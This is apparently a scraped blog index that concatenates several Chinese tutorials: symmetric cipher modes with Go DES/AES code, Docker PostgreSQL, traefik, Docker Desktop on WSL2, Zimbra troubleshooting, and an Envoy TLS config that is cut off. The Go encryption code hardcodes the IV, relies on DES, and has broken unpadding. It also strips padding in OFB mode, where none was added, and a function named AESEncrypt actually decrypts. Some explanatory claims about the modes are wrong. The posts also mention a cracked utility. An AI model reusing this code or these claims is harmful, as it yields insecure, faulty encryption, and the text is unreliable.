适用于数据较少的情形，加密前需要把明文数据填充到块大小的整倍数。\n使用ECB模式加密时，相同的明文分组会被转换为相同的密文分组，因此ECB模式也称为电子密码本模式当最后一个明文分组的内容小于分组长度时（如一个分组8bit），需要用一特定的数据进行填充（padding），让值一个分组长度等于分组长度。\nECB模式是所有模式中最简单的一种。ECB模式中，明文分组与密文分组是一一对应的关系，因此，如果明文中存在多个相同的明文分组，则这些明文分组最终都将被转换为相同的密文分组。这样一来，只要观察一下密文，就可以知道明文中存在怎样的重复组合，并可以以此为线索来破译密码，因此ECB模式是存在一定风险的。\nCBC模式：Cipher Block Chaining mode（密码分组链接/密码块 模式） 1976年，IBM发明了密码分组链接CBC。CBC模式中每一个分组要先和前一个分组加密后的数据进行XOR异或操作，然后再进行加密。 这样每个密文块依赖该块之前的所有明文块，为了保持每条消息都具有唯一性，在第一个块进行加密之前需要用初始化向量 IV 进行异或操作。 CBC模式是一种最常用的加密模式，它主要缺点是加密是连续的，不能并行处理，并且与ECB一样消息块必须填充到块大小的整倍数。\n**当加密第一个明文分组时，由于不存在 “前一个密文分组\u0026quot;，因此需要事先准备一个长度为一个分组的比特序列来代替“前一个密文分组\u0026quot;，这个比特序列称为初始化向量（initialization vector）**通常缩写为 IV。一般来说，每次加密时都会随机产生一个不同的比特序列来作为初始化向量。\nCFB模式：Cipher FeedBack mode（密文反馈模式） 密文反馈模式 CFB；在CFB模式中，前一个分组的密文加密后和当前分组的明文XOR异或操作生成当前分组的密文。所谓反馈，这里指的就是返回输入端的意思，即前一个密文分组会被送回到密码算法的输入端。\n在ECB和CBC中，明文分组都是通过密码算法进行加密的，然而，在CFB模式中，明文分组和密文分组之间并没有经过\u0026quot;加密\u0026quot;这一步骤，明文分和密文分组之间只有一个XOR。\nOFB模式：Output FeedBack mode（输出反馈模式） 输出反馈模式, OFB。在OFB模式中，上一个分组密码算法的输出是当前分组密码算法的输入（下图）\nCTR模式：CounTeR mode（计数器模式） CTR是一种通过将逐次累加的计数器进行加密来生成密钥流的流密码；即每个分组对应一个逐次累加的计数器，并通过对计数器进行加密来生成密钥流。也就是说，最终的密文分组是通过将计数器加密得到的比特序列，与明文分组进行XOR而得到的。\nCTR模式的特点\nCTR模式的加密和解密使用了完全相同的结构，因此在程序实现上比较容易。这一特点和同为流密码的OFB模式是一样的。 CTR模式中可以以任意顺序对分组进行加密和解密，因此在加密和解密时需要用到的“计数器\u0026quot;的值可以由nonce和分组序号直接计算出来。这一性质是OFB模式所不具备的。 CTR模式能够以任意顺序处理分组，就意味着能够实现并行计算。在支持并行计算的系统中，CTR模式的速度是非常快的。\n总结\n初始化向量 - IV\necb, ctr模式不需要初始化向量 cbc, ofc, cfb需要初始化向量 最后一个明文分组的填充\n使用cbc, ecb需要填充 明文分组中进行了填充, 然后加密 解密密文得到明文, 需要把填充的字节删除 使用 ofb, cfb, ctr不需要填充 对称加密在Go语言中的实现方式 CBC分组模式 /* * @brief DES加密函数， * @param1 加密的明文 * @param2 秘钥 * @return，得到的密文 */ func DesEncrypt(plainText, key string) ([]byte, error) { var ( // 创建一个des加密的接口 block, err = des.NewCipher([]byte(key)) // 分组加密 需要对最后进行填充 padText = LastPadding([]byte(plainText), block.BlockSize()) cipherText = make([]byte, len(padText)) ) if err != nil { return nil, err } // 创建使用cbc分组模式加密接口 mode := cipher.NewCBCEncrypter(block, []byte(\u0026quot;12345678\u0026quot;)) // 加密 mode.CryptBlocks(cipherText, padText) return cipherText, nil } /* * @brief DES解密函数， * @param1 加密的明文 * @param2 秘钥 * @return，得到的密文 */ func DesDecrypt(cipherText, key string) ([]byte, error) { var ( // 创建一个des加密的接口 block, err = des.NewCipher([]byte(key)) // 创建使用cbc分组模式解密接口 mode = cipher.NewCBCDecrypter(block, []byte(\u0026quot;12345678\u0026quot;)) byteCipherText = []byte(cipherText) // 明文存储变量 plainText = make([]byte, len(byteCipherText)) ) if err != nil { return nil, err } // 解密，无返回值 mode.CryptBlocks(plainText, byteCipherText) // 将填充的内容删除 return LastUnPadding(plainText, des.BlockSize), nil } 总结\nDES使用64bit钥对数据块进行加密 在Go语言中iv的长须需要与密钥对长度一致。 CBC使用的流密码算法 CBC需要对最后明文分组填充 OFB分组模式 func OFBEncrypt(plainText, key string) ([]byte, error) { var ( // 创建一个des加密的接口 block, err = des.NewCipher([]byte(key)) // 分组加密 需要对最后进行填充 cipherText = make([]byte, len(plainText)) ) if err != nil { return nil, err } // 创建使用cbc分组模式加密接口 mode := cipher.NewOFB(block, []byte(\u0026quot;12345678\u0026quot;)) //mode := cipher.NewCBCEncrypter(block, []byte(\u0026quot;12345678\u0026quot;)) // 加密 mode.XORKeyStream(cipherText, []byte(plainText)) return cipherText, nil } func OFBDecrypt(cipherText, key string) ([]byte, error) { var ( // 创建一个des加密的接口 block, err = des.NewCipher([]byte(key)) // 创建使用cbc分组模式解密接口 mode = cipher.NewOFB(block, []byte(\u0026quot;12345678\u0026quot;)) byteCipherText = []byte(cipherText) // 明文存储变量 plainText = make([]byte, len(byteCipherText)) ) if err != nil { return nil, err } // 解密，无返回值 mode.XORKeyStream(plainText, byteCipherText) // 将填充的内容删除 return LastUnPadding(plainText, des.BlockSize), nil } 填充方式 /* * 填充函数，如果最后一个分组字节数不够则填充，填充的字节数为缺少的字节数 * 如果最后一个字节数正好的话，则新建一个分组 */ func LastPadding(plainText []byte, blockSize int) []byte { var ( // 获得明文的长度，以判断时候需要补充 paddingLength = blockSize - len(plainText)%blockSize // 初始化填充的内容 padText = bytes.Repeat([]byte{byte(paddingLength)}, paddingLength) ) //将填充的内容追加到明文后 return append(plainText, padText...) } /* * 删除填充函数，如果最后一个分组字节数不够则填充，填充的字节数为缺少的字节数 * 如果最后一个字节数正好的话，则新建一个分组 */ func LastUnPadding(plainText []byte, blockSize int) []byte { var ( // 获得明文的长度，以判断时候需要补充 paddingLength = len(plainText) // 获得尾部填充的字节数量 lastChar = int(plainText[paddingLength-1]) ) return bytes.TrimFunc(plainText, func(r rune) bool { return r == rune(lastChar) }) } 总结\nofb不需要最后为明文分组填充 加密算法Go语言API已经提供，但算法的分组业务流程需要自己实现 AES func AESEncrypt(cipherText, key string) ([]byte, error) { var ( // 创建一个AES加密的接口 block, err = aes.NewCipher([]byte(key)) byteCipherText = []byte(cipherText) // 明文存储变量 plainText = make([]byte, len(byteCipherText)) ) if err != nil { return nil, err } // 创建使用cbc分组模式解密接口 mode := cipher.NewOFB(block, []byte(\u0026quot;1234567812345678\u0026quot;)) // 解密，无返回值 mode.XORKeyStream(plainText, byteCipherText) // 将填充的内容删除 return LastUnPadding(plainText, aes.BlockSize), nil } 总结\nAES秘钥为 16,24,32 Byte 即 128,196,256 bit 在无需明文填充的分组模式下，ofb cfb ctr，加密解密的业务逻辑处理是一样的。 ","permalink":"https://www.oomkill.com/2020/10/symmetric/","summary":"","title":"常用加密算法学习总结之对称加密"},{"content":"在本文，尝试使用 Docker 运行 PostgreSQL ，为了适配 goalert 项目，因为从来没有尝试过使用 PostgreSQL\n了解PostgreSQL数据库 在我们继续运行 PostgreSQL 数据库的 Docker 容器之前，我们先来了解一下 PostgreSQL 数据库。 PostgreSQL 是一个开源 RDMS，类似于 MySQL。 它是一个面向对象的数据库，但我们可以处理结构化和非结构化数据。\nPostgreSQL 数据库可以运行在各种平台上，包括 Windows、Mac OS X 和 Linux。它还提供高级数据类型和性能优化功能来存储和扩展复杂的数据库工作负载。\n使用公共镜像运行PostgreSQL 要使用 Docker 运行 PostgreSQL，我们首先需要拉取 Docker Hub 上可用的 postgres 公共镜像：\ndocker pull postgres 在上面的命令中，我们拉取了 postgres 最新的稳定版镜像。 如果要指定版本的 postgres 镜像，可以使用以下命令\ndocker pull postgres:14.2 这里将使用 postgres:14.2 版本来运行 Postgres 的容器，这里命令主要为 Linux\ndocker run -d -e POSTGRES_USER=admin -e POSTGRES_PASSWORD=111111 -p 5432:5432 -v /data:/var/lib/postgresql/data --name postgresql postgres 如果在 window 或 wsl 上运行，可以执行下面命令\ndocker run -d -e POSTGRES_USER=admin -e POSTGRES_PASSWORD=111111 -p 5432:5432 -v /data:/var/lib/postgresql/data --name postgresql postgres ","permalink":"https://www.oomkill.com/2020/10/postgresql-docker-setup/","summary":"","title":"Docker运行PostgreSQL"},{"content":"traefik概述 traefik-现代反向代理，也可称为现代边缘路由；traefik原声兼容主流集群，Kubernetes，Docker，AWS等。官方的定位traefik是一个让开发人员将时间花费在系统研发与部署功能上，而非配置和维护。并且traefik官方也提供自己的服务网格解决方案\n作为一个 modern edge router ，traefik拥有与envoy相似的特性\n基于go语言研发，目的是为了简化开发人员的配置和维护 tcp/udp支持 http L7支持 GRPC支持 服务发现和动态配置 front/ edge prory支持 可观测性 流量管理 \u0026hellip; traefik 术语 要了解trafik，首先需要先了解一下 有关trafik中的一些术语。\nEntryPoints 入口点，是可以被下游客户端连接的命名网络位置，类似于envoy 的listener和nginx的listen services 服务，负载均衡，上游主机接收来自traefik的连接和请求并返回响应。 类似于nginx upstream envoy的clusters Providers 提供者，提供配置文件的后端，如文件，consul，redis，etcd等，可使traefik自动更新 routers 路由器，分析请求，将下游主机的请求处理转入到services middlewares: 中间件，在将下游主机的请求转入到services时进行的流量调整 traefik部署安装 traefik为go语言开发的，可以直接下载运行即可。此处介绍直接运行二进制程序\n后端环境准备,此处为docker运行的两个后端。\nversion: '3' services: webserver1: image: sealloong/envoy-end:latest ports: - 91:90 networks: envoymesh: aliases: - v1_server - default_server environment: - VERSION=v1 - COLORFUL=blue expose: - 90 webserver2: image: sealloong/envoy-end:latest ports: - 92:90 networks: envoymesh: aliases: - v1_server - default_server environment: - VERSION=v1 - COLORFUL=blue expose: - 90 networks: envoymesh: {} traefik配置说明 Traefik中的配置可以引用两种不同的内容：\n完全动态路由配置（动态配置） 启动时配置（静态配置） 静态配置一般定义traefik的endpoints 与providers，这些不经常变动 动态配置一般定义traefik的处理浏览的部分，如 中间件，路由，浏览管理等。\ntraefik1 与 traefik2的配置文件不兼容 此处配置主要以file方式讲解。\n静态配置部分：\nentryPoints: web: address: :8081 [api] dashboard = true insecure = true providers: file: filename: ./root.yaml [accessLog] filePath = \u0026quot;/root/access.log\u0026quot; format = \u0026quot;json\u0026quot; 动态配置部分\nhttp: routers: router0: rule: \u0026quot;Host(`test.com`)\u0026quot; service: \u0026quot;service-foo\u0026quot; entryPoints: - web router1: rule: \u0026quot;Path(`/`)\u0026quot; service: \u0026quot;baidu\u0026quot; entryPoints: - web services: service-foo: loadBalancer: servers: - url: \u0026quot;http://10.0.0.4:91/\u0026quot; - url: \u0026quot;http://10.0.0.4:92/\u0026quot; baidu: loadBalancer: servers: - url: http://www.baidu.com/ ","permalink":"https://www.oomkill.com/2020/10/traefik-on-physical/","summary":"","title":"将traefik部署为传统web架构模式"},{"content":"检查要求 Windows 10 企业版、专业版或教育版 （必须windows10 1903版本以上）版本号 18362.1049+ 或 18363.1049+ ，次版本＃大于.1049。最好是最新版（新版windows可以hype-v wsl2 vmvare共存，但安卓模拟器目前还没稳定的共存版本）。建议使用wsl2，安装包容量会比起hype-v小很多 。 Windows开启wsl2，建议 Windows 10 2004（版本号不低于 19041.264），可wsl2与vmvare共存。 CPU 支持并开启虚拟化（Intel VT-c 或 AMD SVM）。 最少 4 GB 内存。 对于专业版、企业版、教育版可以使用docker desktop wsl2模式，此处无需开启Hype-v\n对于Win10 家庭版，Win10 19041.264之前版本，及 Win7 8用户，可以使用docker desktop Hype-v 后端。\n修改安装盘 Docker Desktop 默认安装到 C:\\Program Files\\Docker 并不可更改，这样很不友好，可以通过软连接的方式改变Docker Desktop 默认安装盘。\nmklink /J \u0026quot;C:\\Program Files\\Docker\u0026quot; \u0026quot;D:\\Program Files\\Docker\u0026quot;\r限制wsl2运行最大内存 WSL 是 Microsoft 提供的一项功能，可以使开发人员能够直接在 Windows 上运行 GNU/Linux 环境，无需修改，无需传统虚拟机或双引导设置，减少了开发人员的使用复杂度\n在 Docker Desktop 使用了 WSL 2 中的动态内存分配特性，极大地提高了资源消耗。这意味着，Docker Desktop 仅使用其所需的 CPU 和内存资源量，同时使 CPU 和内存密集型任务（例如构建容器）运行得更快。\n但WSL2目前一个弊端，可能WSL2 vm会分配所有可用内存，并最终导致操作系统和其他应用程序的内存不足。\n所以需要对WLS2内存和CPU资源进行限制，在 cmd 或 powshell 终端中\nwsl --shutdown\rnotepad \u0026quot;$env:USERPROFILE/.wslconfig\u0026quot;\r在用户目录创建一个文件.wslconfig ，编辑 .wslconfig\n[wsl2]\rmemory=3GB # 限制wsl2的虚拟机最大内存\rprocessors=4 # 限制wsl2使用的处理器数量\rswap=0 # 不使用交换文件\r安装Docker Desktop 完成上面的操作，可以安装Docker Desktop了。从Docker Desktop网站下载安装Docker Desktop for Windows，大于500M。\n安装步骤基本上点击操作即可，没有什么难度\n镜像路径迁移 当使用了WSL2作为Docker Desktop后端引擎时，WSL 2 Docker-Desktop-Data 的VM磁盘镜像通常在 %USERPROFILE%\\AppData\\Local\\Docker\\wsl\\data\\ext4.vhdx 路径下，docker-desktop通常在%LOCALAPPDATA%/Docker/wsl 路径下，因为镜像的大小及一些交换文件，通常会占用大量C盘空间，可以改变其存储位置。\nwsl --list -v\r输入上述命令可以看到如下内容\nNAME STATE VERSION\r* docker-desktop Stopped 2\rdocker-desktop-data Stopped 2\rdocker-desktop 替换了之前使用的 Hyper-V VM 实现 Docker Desktop。这处理容器的引导和管理。\ndocker-desktop-data 是存储docker镜像和配置的地方；实际上是对 Hyper-V 以前使用的虚拟硬盘的直接替换。\n从这里可以看出Docker Desktop使用了WSL2作为后端引擎时，实际上整个应用作为WLS2的两个子系统进行的。可以通过迁移WSL2系统镜像的存储位置来改变Docker霸占C盘不可转移的弊端。\n导出wsl系统镜像\nwsl --export docker-desktop docker-desktop.tar\rwsl --export docker-desktop-data docker-desktop-data.tar\r删除Docker Desktop wsl子系统，此操作会自动删除 ext4.vhdx 文件，故需要先导出一份备份\nwsl --unregister docker-desktop\rwsl --unregister docker-desktop-data\r导入重新创建wsl Docker Desktop子系统\nwsl --import docker-desktop d:\\{new_path} docker-desktop.tar\rwsl --import docker-desktop-data d:\\{new_path} docker-desktop-data.tar\r完成后，启动Docker服务，如果服务正常，可以删除掉 docker-desktop.tar 与 docker-desktop-data.tar\n无法启动 我在使用windows时，会安装冰点还原，因为windows10 以上需要 冰点还原 8.38以上，我这里使用 8.38.020.4676 版本时，在开启还原状态时，Docker无法正常启动，在关闭还原时，可以正常启动。更换 8.62.020.5630。后正常。 8.38.020.4676 是2017年的版本，当时Docker对windows兼容并不好，而8.38.020.4676 是2020年发行的版本，目前在使用中并未发现异常。 8.38.020.4676 与 8.62.020.5630为网上常见的纯净的破解版了，所以按需选择使用。\n","permalink":"https://www.oomkill.com/2020/10/windows10-install-docker/","summary":"","title":"windows下Docker Desktop安装管理"},{"content":"启动故障：zimbra postsuper: fatal: scan_dir_push: open directory defer: Permission denied Host mail.domain.com Starting ldap...Done. Starting zmconfigd...Done. Starting dnscache...Done. Starting logger...Done. Starting mailbox...Done. Starting memcached...Done. Starting proxy...Done. Starting amavis...Done. Starting antispam...Done. Starting antivirus...Done. Starting opendkim...Done. Starting snmp...Done. Starting spell...Done. Starting mta...Failed. Starting saslauthd...done. postsuper: fatal: scan_dir_push: open directory defer: Permission denied postfix failed to start Starting stats...Done. Starting service webapp...Done. Starting zimbra webapp...Done. Starting zimbraAdmin webapp...Done. Starting zimlet webapp...Done. 查看服务器状态：\nmta Stopped postfix is not running 经查看mta服务是由postfix启动。\n查看系统是否已经对自带的sendmail和postfix进行关闭，端口25是否被占用，如果是请关闭并重启zimbra\n如果不是则执行/opt/zimbra/libexec/zmfixperms (run as root)\nRefer：Zimbra 启动时mta无法启动 postsuper: fatal: scan_dir_push: open directory defer: Permission denied\n错误： opendkim: /opt/zimbra/conf/opendkim.conf: ldap://xxxx333.com:389/?DKIMSelector?sub?(DKIMIdentity=$d): dkimf_db_open(): Connect error Failed to start opendkim: 0 原因：无法连接至ldap服务，检查ldap服务是否正常\nRefer：ZCS 8.0 mta error with zmopendkimctl error 错误：Error: Queue report unavailable zmcontrol status Host mail.ttdconline.com amavis Running antispam Running antivirus Running ldap Running logger Running mailbox Running memcached Running mta Running opendkim Running proxy Running service webapp Running snmp Running spell Running stats Running zimbra webapp Running zimbraAdmin webapp Running zimlet webapp Running zmconfigd Running We reviewed logs and services and we see that the MTA is down: $ tail -f /var/log/mail.log Jan 22 11:08:00 zcs postfix/postqueue[19195]: fatal: Queue report unavailable – mail system is down Refer: Error: Queue report unavailable – mail system is down\t错误 Logswatch Failed zimbra logswatch failed\n. /opt/zimbra/.bashrc\nStarting logger...Failed. [b]Starting logswatch...failed.[/b] Refer: 8.8.15 Starting Logswatch Failed\n修改管理员账户密码 server.domain.com (https://server.domain.com:7071) 是当前运行的zimbra的域名或者IP地址，默认的http监听端口为7071 输入用户名： admin@domain.com 和密码，完成登录\n在zimbra安装配置时创建了管理员账户，可以在web端的账户工具栏任何时候进行账户密码修改，选择administrator 用户并选择密码修改 也可以在命令行中运行zmprov进行管理员账户密码的修改：\nzmprov sp admin@domain.com \u0026lt;password\u0026gt; zmprov gaaa //列出所有管理员 zmprov sp admin q1w2e3r4 或 zmprov sp admin@wish.com q12e3r4 # 修改管理员账号密码 清除队列 查看发送队列数量:\n/opt/zimbra/libexec/zmqstat 查看队列内容\nmailq 删除队列\n/opt/zimbra/postfix/sbin/postqueue -f 查看邮件队列\n/opt/zimbra/postfix/sbin/postcat -qv EC753D0D00 Refer：\nManaging The Postfix Queues\n[Zimbra – deleting all email in queue by sender](Zimbra – deleting all email in queue by sender)\n被攻击状态 查看邮件状态\n$ /opt/zimbra/libexec/zmqstat hold=0 corrupt=0 deferred=563344 active=19992 incoming=45830 postmap /opt/zimbra/conf/restricted_senders postmap /opt/zimbra/conf/local_domains postmap ../common/conf/main.cf 问题\nFeb 23 00:36:56 ${domainname} postfix/postscreen[7614]: PASS OLD [193.26.3.10]:63396 Feb 23 00:36:56 ${domainname} postfix/smtpd[7615]: connect from mail.health.kiev.ua[193.26.3.10] Feb 23 00:36:57 ${domainname} postfix/smtpd[7615]: Anonymous TLS connection established from mail.health.kiev.ua[193.26.3.10]: TLSv1 with cipher DHE-RSA-AES256-SHA (256/256 bits) Feb 23 00:36:58 ${domainname} postfix/smtpd[7615]: warning: lmdb:/opt/zimbra/conf/restricted_senders is unavailable. open database /opt/zimbra/conf/restricted_senders.lmdb: MDB_INVALID: File is not an LMDB file Feb 23 00:36:58 ${domainname} postfix/smtpd[7615]: warning: lmdb:/opt/zimbra/conf/restricted_senders: table lookup problem Feb 23 00:36:58 ${domainname} postfix/smtpd[7615]: NOQUEUE: reject: RCPT from mail.health.kiev.ua[193.26.3.10]: 451 4.3.5 \u0026lt;\u0026gt;: Sender address rejected: Server configuration error; from=\u0026lt;\u0026gt; to=\u0026lt;vivian@${domainname}.com\u0026gt; proto=ESMTP helo=\u0026lt;mail.health.kiev.ua\u0026gt; Feb 23 00:36:59 ${domainname} postfix/smtpd[7615]: warning: lmdb:/opt/zimbra/conf/restricted_senders is unavailable. open database /opt/zimbra/conf/restricted_senders.lmdb: MDB_INVALID: File is not an LMDB file Feb 23 00:36:59 ${domainname} postfix/smtpd[7615]: warning: lmdb:/opt/zimbra/conf/restricted_senders: table lookup problem Feb 23 00:36:59 ${domainname} postfix/smtpd[7615]: NOQUEUE: reject: RCPT from mail.health.kiev.ua[193.26.3.10]: 451 4.3.5 \u0026lt;\u0026gt;: Sender address rejected: Server configuration error; from=\u0026lt;\u0026gt; to=\u0026lt;vivian@${domainname}.com\u0026gt; proto=ESMTP helo=\u0026lt;mail.health.kiev.ua\u0026gt; Feb 23 00:37:00 ${domainname} postfix/smtpd[7615]: warning: lmdb:/opt/zimbra/conf/restricted_senders is unavailable. open database /opt/zimbra/conf/restricted_senders.lmdb: MDB_INVALID: File is not an LMDB file Feb 23 00:37:00 ${domainname} postfix/smtpd[7615]: warning: lmdb:/opt/zimbra/conf/restricted_senders: table lookup problem Feb 23 00:37:00 ${domainname} postfix/smtpd[7615]: NOQUEUE: reject: RCPT from mail.health.kiev.ua[193.26.3.10]: 451 4.3.5 \u0026lt;\u0026gt;: Sender address rejected: Server configuration error; from=\u0026lt;\u0026gt; to=\u0026lt;vivian@${domainname}.com\u0026gt; proto=ESMTP helo=\u0026lt;mail.health.kiev.ua\u0026gt; Feb 23 00:37:00 ${domainname} postfix/postqueue[13129]: fatal: Queue report unavailable - mail system is down Feb 23 00:37:01 ${domainname} postfix/smtpd[7615]: warning: lmdb:/opt/zimbra/conf/restricted_senders is unavailable. open database /opt/zimbra/conf/restricted_senders.lmdb: MDB_INVALID: File is not an LMDB file Feb 23 00:37:01 ${domainname} postfix/smtpd[7615]: warning: lmdb:/opt/zimbra/conf/restricted_senders: table lookup problem Feb 23 00:37:01 ${domainname} postfix/smtpd[7615]: NOQUEUE: reject: RCPT from mail.health.kiev.ua[193.26.3.10]: 451 4.3.5 \u0026lt;\u0026gt;: Sender address rejected: Server configuration error; from=\u0026lt;\u0026gt; to=\u0026lt;vivian@${domainname}.com\u0026gt; proto=ESMTP helo=\u0026lt;mail.health.kiev.ua\u0026gt; Feb 23 00:37:01 ${domainname} postfix/smtpd[7615]: warning: lmdb:/opt/zimbra/conf/restricted_senders is unavailable. open database /opt/zimbra/conf/restricted_senders.lmdb: MDB_INVALID: File is not an LMDB file Feb 23 00:37:01 ${domainname} postfix/smtpd[7615]: warning: lmdb:/opt/zimbra/conf/restricted_senders: table lookup problem Feb 23 00:37:01 ${domainname} postfix/smtpd[7615]: NOQUEUE: reject: RCPT from mail.health.kiev.ua[193.26.3.10]: 451 4.3.5 \u0026lt;\u0026gt;: Sender address rejected: Server configuration error; from=\u0026lt;\u0026gt; to=\u0026lt;vivian@${domainname}.com\u0026gt; proto=ESMTP helo=\u0026lt;mail.health.kiev.ua\u0026gt; Feb 23 00:37:05 ${domainname} postfix/smtpd[7615]: warning: lmdb:/opt/zimbra/conf/restricted_senders is unavailable. open database /opt/zimbra/conf/restricted_senders.lmdb: MDB_INVALID: File is not an LMDB file Feb 23 00:37:05 ${domainname} postfix/smtpd[7615]: warning: lmdb:/opt/zimbra/conf/restricted_senders: table lookup problem 解决：找其他服务器处理这个问题并修改配置\nlocal_only = check_recipient_access lmdb:/opt/zimbra/conf/local_domains, reject 正常\nFeb 23 00:49:31 ${domainname} postfix/smtpd[24306]: connect from iZj6c4jc5vsy383um5cgomZ[172.31.108.227] Feb 23 00:49:31 ${domainname} postfix/smtpd[24306]: NOQUEUE: reject: RCPT from iZj6c4jc5vsy383um5cgomZ[172.31.108.227]: 554 5.7.1 \u0026lt;test1@${domainname}.com\u0026gt;: Sender address rejected: Access denied; from=\u0026lt;test1@${domainname}.com\u0026gt; to=\u0026lt;test@163.com\u0026gt; proto=ESMTP helo=\u0026lt;${domainname}.com\u0026gt; Feb 23 00:49:31 ${domainname} postfix/smtpd[24306]: disconnect from iZj6c4jc5vsy383um5cgomZ[172.31.108.227] ehlo=1 mail=1 rcpt=0/1 quit=1 commands=3/4 Feb 23 00:49:31 ${domainname} zmconfigd[17300]: Tracking service snmp Feb 23 00:49:32 ${domainname} zmconfigd[17300]: Watchdog: service antivirus status is OK. Feb 23 00:49:32 ${domainname} zmconfigd[17300]: All rewrite threads completed in 0.00 se 配置安全策略\nZimbra 8.7.11规则：只能发送内部邮件\nDomain level blocking of users\nRejecting Emails at SMTP Level\n配置监控策略\n配置磁盘空间的告警\n","permalink":"https://www.oomkill.com/2020/10/zimbra-troubleshooing/","summary":"","title":"zimbra安装故障记录"},{"content":"环境准备 主机 角色 数量 front-envoy front envoy 1 service envoy 作为内部后端的envoy 2 end 后端应用程序 2 访问 / front-envoy ==\u0026gt; end * 2 访问 /red/colorful ==\u0026gt; end red 不验证客户端证书 单项tls 访问 /gray/colorful ==\u0026gt; end gray 验证客户端证书 双项tls\ndocker-compose version: '3' services: front-envoy: image: envoyproxy/envoy-alpine:v1.15-latest environment: - ENVOY_UID=0 ports: - 80:80 - 443:443 - 82:9901 volumes: - ./envoy.yaml:/etc/envoy/envoy.yaml - ./certs/front-envoy/:/etc/envoy/certs/ - ./certs/CA/:/etc/envoy/ca/ networks: envoymesh: aliases: - front-envoy depends_on: - webserver1 - webserver2 gray-envoy: image: envoyproxy/envoy-alpine:v1.15-latest environment: - ENVOY_UID=0 volumes: - ./service_gray.yaml:/etc/envoy/envoy.yaml - ./certs/service_gray/:/etc/envoy/certs/ - ./certs/CA1/:/etc/envoy/ca/ network_mode: \u0026quot;service:webserver1\u0026quot; depends_on: - webserver1 red-envoy: image: envoyproxy/envoy-alpine:v1.15-latest environment: - ENVOY_UID=0 volumes: - ./service_red.yaml:/etc/envoy/envoy.yaml - ./certs/service_red/:/etc/envoy/certs/ - ./certs/CA1/:/etc/envoy/ca/ network_mode: \u0026quot;service:webserver2\u0026quot; depends_on: - webserver2 webserver1: image: cylonchau/envoy-end:latest networks: envoymesh: aliases: - service_gray - front_envoy environment: - VERSION=v1 - COLORFUL=gray expose: - 90 webserver2: image: cylonchau/envoy-end:latest networks: envoymesh: aliases: - service_red - front_envoy environment: - VERSION=v1 - COLORFUL=red expose: - 90 networks: envoymesh: {} front-envoy admin: access_log_path: \u0026quot;/dev/null\u0026quot; address: socket_address: address: 0.0.0.0 port_value: 9901 static_resources: secrets: - name: servers tls_certificate: certificate_chain: filename: \u0026quot;/etc/envoy/certs/server.crt\u0026quot; private_key: filename: \u0026quot;/etc/envoy/certs/server.key\u0026quot; - name: clients tls_certificate: certificate_chain: filename: \u0026quot;/etc/envoy/certs/client.crt\u0026quot; private_key: filename: \u0026quot;/etc/envoy/certs/client.key\u0026quot; - name: validation validation_context: trusted_ca: filename: \u0026quot;/etc/envoy/ca/ca.crt\u0026quot; listeners: - name: listener_http address: socket_address: { address: 0.0.0.0, port_value: 80 } filter_chains: - filters: - name: envoy.http_connection_manager typed_config: \u0026quot;@type\u0026quot;: type.googleapis.com/envoy.extensions.filters.network.http_connection_manager.v3.HttpConnectionManager codec_type: auto stat_prefix: ingress_http route_config: name: local_route virtual_hosts: - name: service domains: [ \u0026quot;*\u0026quot; ] routes: - match: { prefix: \u0026quot;/\u0026quot; } redirect: https_redirect: true port_redirect: 443 http_filters: - name: envoy.router - name: listener_https address: socket_address: { address: 0.0.0.0, port_value: 443 } filter_chains: - filters: - name: envoy.http_connection_manager typed_config: \u0026quot;@type\u0026quot;: type.googleapis.com/envoy.extensions.filters.network.http_connection_manager.v3.HttpConnectionManager stat_prefix: ingress_https codec_type: AUTO route_config: name: https_route virtual_hosts: - name: https_route domains: [\u0026quot;*\u0026quot;] routes: - match: { prefix: \u0026quot;/gray/colorful\u0026quot; } route: prefix_rewrite: \u0026quot;/colorful\u0026quot; cluster: gray - match: { prefix: \u0026quot;/red/colorful\u0026quot; } route: prefix_rewrite: \u0026quot;/colorful\u0026quot; cluster: red - match: { prefix: \u0026quot;/\u0026quot; } route: cluster: front_envoy http_filters: - name: envoy.router access_log: - name: envoy.listener.accesslog typed_config: \u0026quot;@type\u0026quot;: type.googleapis.com/envoy.extensions.access_loggers.file.v3.FileAccessLog path: /dev/stdout log_format: text_format: \u0026quot;[%START_TIME%] \\\u0026quot;%REQ(:METHOD)% %REQ(X-ENVOY-ORIGINAL-PATH?:PATH)% %PROTOCOL%\\\u0026quot; %RESPONSE_CODE% %RESPONSE_FLAGS% %BYTES_RECEIVED% %BYTES_SENT% %DURATION% %RESP(X-ENVOY-UPSTREAM-SERVICE-TIME)% \\\u0026quot;%REQ(X-FORWARDED-FOR)%\\\u0026quot; \\\u0026quot;%REQ(USER-AGENT)%\\\u0026quot; \\\u0026quot;%REQ(X-REQUEST-ID)%\\\u0026quot; \\\u0026quot;%REQ(:AUTHORITY)%\\\u0026quot; \\\u0026quot;%UPSTREAM_HOST%\\\u0026quot;\\n\u0026quot; transport_socket: name: envoy.transport_sockets.tls typed_config: \u0026quot;@type\u0026quot;: type.googleapis.com/envoy.extensions.transport_sockets.tls.v3.DownstreamTlsContext common_tls_context: tls_certificate_sds_secret_configs: - name: servers clusters: - name: front_envoy connect_timeout: 0.25s type: strict_dns lb_policy: round_robin load_assignment: cluster_name: front_envoy endpoints: - lb_endpoints: - endpoint: address: socket_address: { address: front_envoy, port_value: 90 } - name: gray connect_timeout: 0.25s type: strict_dns lb_policy: round_robin load_assignment: cluster_name: gray endpoints: - lb_endpoints: - endpoint: address: socket_address: { address: service_gray, port_value: 443 } transport_socket: name: envoy.transport_sockets.tls typed_config: \u0026quot;@type\u0026quot;: type.googleapis.com/envoy.extensions.transport_sockets.tls.v3.UpstreamTlsContext common_tls_context: tls_certificate_sds_secret_configs: - name: clients validation_context_sds_secret_config: name: validation - name: red connect_timeout: 0.25s type: strict_dns lb_policy: round_robin load_assignment: cluster_name: red endpoints: - lb_endpoints: - endpoint: address: socket_address: { address: service_red, port_value: 443 } transport_socket: name: envoy.transport_sockets.tls typed_config: \u0026quot;@type\u0026quot;: type.googleapis.com/envoy.extensions.transport_sockets.tls.v3.UpstreamTlsContext common_tls_context: tls_certificate_sds_secret_configs: - name: clients service gray admin: access_log_path: \u0026quot;/dev/null\u0026quot; address: socket_address: address: 0.0.0.0 port_value: 9901 static_resources: listeners: - name: listener_https address: socket_address: { address: 0.0.0.0, port_value: 443 } filter_chains: - filters: - name: envoy.http_connection_manager typed_config: \u0026quot;@type\u0026quot;: type.googleapis.com/envoy.extensions.filters.network.http_connection_manager.v3.HttpConnectionManager stat_prefix: ingress_https codec_type: AUTO route_config: name: https_route virtual_hosts: - name: https_route domains: [\u0026quot;*\u0026quot;] routes: - match: { 